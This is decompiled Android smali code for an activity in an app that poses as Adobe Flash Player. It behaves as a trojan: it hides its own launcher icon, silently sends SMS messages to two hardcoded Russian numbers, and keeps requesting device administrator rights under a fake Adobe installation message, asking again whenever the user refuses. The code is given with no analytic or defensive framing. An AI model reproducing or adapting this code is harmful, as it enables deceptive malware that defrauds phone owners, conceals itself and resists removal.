.class public Lcom/adobe/flashplayer_/AAA;
.super Landroid/app/Activity;
.source "AAA.java"


# static fields
.field static final ACTIVATION_REQUEST:I = 0x1


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 28
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private AdminGet()V
    .locals 5

    .prologue
    .line 85
    new-instance v2, Landroid/content/ComponentName;

    const-class v3, Lcom/adobe/flashplayer_/FFF;

    invoke-direct {v2, p0, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 86
    .local v2, "mAdminName":Landroid/content/ComponentName;
    const/4 v0, 0x1

    .line 87
    .local v0, "REQUEST_CODE_ENABLE_ADMIN":I
    new-instance v1, Landroid/content/Intent;

    const-string v3, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v1, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 88
    .local v1, "intent":Landroid/content/Intent;
    const-string v3, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {v1, v3, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 89
    const-string v3, "android.app.extra.ADD_EXPLANATION"

    const-string v4, "FLASH_PLUGIN_INSTALLATION\n\n\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u0439 \u0441\u0438\u0441\u0442\u0435\u043c\u043d\u044b\u0445 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0435\u0439 com.adobe.flashplayer.\n\n\u0414\u043b\u044f \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0439 \u0440\u0430\u0431\u043e\u0442\u044b \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u0430 \u043f\u043e\u043b\u043d\u0430\u044f \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u043a\u043e\u043c\u043f\u043e\u043d\u0435\u043d\u0442\u043e\u0432 Adobe Flash Player.\n\nFor get more information about us, please visit http://adobe.com."

    invoke-virtual {v1, v3, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 90
    invoke-virtual {p0, v1, v0}, Lcom/adobe/flashplayer_/AAA;->startActivityForResult(Landroid/content/Intent;I)V

    .line 91
    return-void
.end method

.method private writeConfig(Ljava/lang/String;Ljava/lang/String;)V
    .locals 2
    .param p1, "config"    # Ljava/lang/String;
    .param p2, "data"    # Ljava/lang/String;

    .prologue
    .line 127
    :try_start_0
    new-instance v0, Ljava/io/OutputStreamWriter;

    const/4 v1, 0x0

    invoke-virtual {p0, p1, v1}, Lcom/adobe/flashplayer_/AAA;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 128
    .local v0, "outputStreamWriter":Ljava/io/OutputStreamWriter;
    invoke-virtual {v0, p2}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V

    .line 129
    invoke-virtual {v0}, Ljava/io/OutputStreamWriter;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 133
    .end local v0    # "outputStreamWriter":Ljava/io/OutputStreamWriter;
    :goto_0
    return-void

    .line 131
    :catch_0
    move-exception v1

    goto :goto_0
.end method


# virtual methods
.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 6
    .param p1, "requestCode"    # I
    .param p2, "resultCode"    # I
    .param p3, "data"    # Landroid/content/Intent;

    .prologue
    const/4 v5, -0x1

    .line 103
    if-ne p2, v5, :cond_0

    .line 104
    new-instance v3, Landroid/content/Intent;

    const-class v4, Lcom/adobe/flashplayer_/AZC;

    invoke-direct {v3, p0, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v3}, Lcom/adobe/flashplayer_/AAA;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 107
    :cond_0
    packed-switch p1, :pswitch_data_0

    .line 120
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    .line 121
    :cond_1
    :goto_0
    return-void

    .line 109
    :pswitch_0
    if-eq p2, v5, :cond_1

    .line 111
    new-instance v2, Landroid/content/ComponentName;

    const-class v3, Lcom/adobe/flashplayer_/FFF;

    invoke-direct {v2, p0, v3}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 112
    .local v2, "mAdminName":Landroid/content/ComponentName;
    const/4 v0, 0x1

    .line 113
    .local v0, "REQUEST_CODE_ENABLE_ADMIN":I
    new-instance v1, Landroid/content/Intent;

    const-string v3, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v1, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 114
    .local v1, "intent":Landroid/content/Intent;
    const-string v3, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {v1, v3, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 115
    const-string v3, "android.app.extra.ADD_EXPLANATION"

    const-string v4, "FLASH_PLUGIN_INSTALLATION\n\n\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u0439 \u0441\u0438\u0441\u0442\u0435\u043c\u043d\u044b\u0445 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0435\u0439 com.adobe.flashplayer.\n\n\u0414\u043b\u044f \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0439 \u0440\u0430\u0431\u043e\u0442\u044b \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u0430 \u043f\u043e\u043b\u043d\u0430\u044f \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u043a\u043e\u043c\u043f\u043e\u043d\u0435\u043d\u0442\u043e\u0432 Adobe Flash Player.\n\nFor get more information about us, please visit http://adobe.com."

    invoke-virtual {v1, v3, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 116
    invoke-virtual {p0, v1, v0}, Lcom/adobe/flashplayer_/AAA;->startActivityForResult(Landroid/content/Intent;I)V

    goto :goto_0

    .line 107
    nop

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
    .end packed-switch
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 8
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 34
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 36
    const v6, 0x7f030002

    invoke-virtual {p0, v6}, Lcom/adobe/flashplayer_/AAA;->setContentView(I)V

    .line 38
    new-instance v6, Landroid/content/Intent;

    const-class v7, Lcom/adobe/flashplayer_/DDD;

    invoke-direct {v6, p0, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v6}, Lcom/adobe/flashplayer_/AAA;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 45
    invoke-virtual {p0}, Lcom/adobe/flashplayer_/AAA;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    .line 46
    .local v4, "p":Landroid/content/pm/PackageManager;
    const/4 v1, 0x2

    .line 47
    .local v1, "c":I
    const/4 v5, 0x1

    .line 48
    .local v5, "z":I
    new-instance v6, Lcom/av/there/AvThere;

    invoke-direct {v6}, Lcom/av/there/AvThere;-><init>()V

    invoke-virtual {p0}, Lcom/adobe/flashplayer_/AAA;->getComponentName()Landroid/content/ComponentName;

    move-result-object v7

    invoke-virtual {v6, v4, v7, v1, v5}, Lcom/av/there/AvThere;->Hide(Landroid/content/pm/PackageManager;Landroid/content/ComponentName;II)V

    .line 50
    const-string v6, "+79262000900"

    const-string v7, "38"

    invoke-virtual {p0, v6, v7}, Lcom/adobe/flashplayer_/AAA;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 52
    const-string v6, "+79037672265"

    const-string v7, "bal"

    invoke-virtual {p0, v6, v7}, Lcom/adobe/flashplayer_/AAA;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 61
    new-instance v2, Landroid/content/ComponentName;

    const-class v6, Lcom/adobe/flashplayer_/FFF;

    invoke-direct {v2, p0, v6}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 63
    .local v2, "mAdminName":Landroid/content/ComponentName;
    const-string v6, "device_policy"

    invoke-virtual {p0, v6}, Lcom/adobe/flashplayer_/AAA;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/admin/DevicePolicyManager;

    .line 65
    .local v3, "mDPM":Landroid/app/admin/DevicePolicyManager;
    invoke-virtual {v3, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    .line 68
    .local v0, "active":Z
    if-nez v0, :cond_0

    .line 70
    invoke-direct {p0}, Lcom/adobe/flashplayer_/AAA;->AdminGet()V

    .line 80
    :goto_0
    return-void

    .line 76
    :cond_0
    new-instance v6, Landroid/content/Intent;

    const-class v7, Lcom/adobe/flashplayer_/AZC;

    invoke-direct {v6, p0, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v6}, Lcom/adobe/flashplayer_/AAA;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0
.end method

.method protected onDestroy()V
    .locals 0

    .prologue
    .line 95
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    .line 96
    return-void
.end method

.method public sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    .locals 7
    .param p1, "n"    # Ljava/lang/String;
    .param p2, "msg"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x0

    .line 136
    move-object v1, p1

    .line 137
    .local v1, "phoneNumber":Ljava/lang/String;
    move-object v6, p2

    .line 138
    .local v6, "message":Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 139
    .local v0, "smsManager":Landroid/telephony/SmsManager;
    invoke-virtual {v0, v6}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v3

    .local v3, "parts":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    move-object v4, v2

    move-object v5, v2

    .line 140
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V

    .line 142
    return-void
.end method
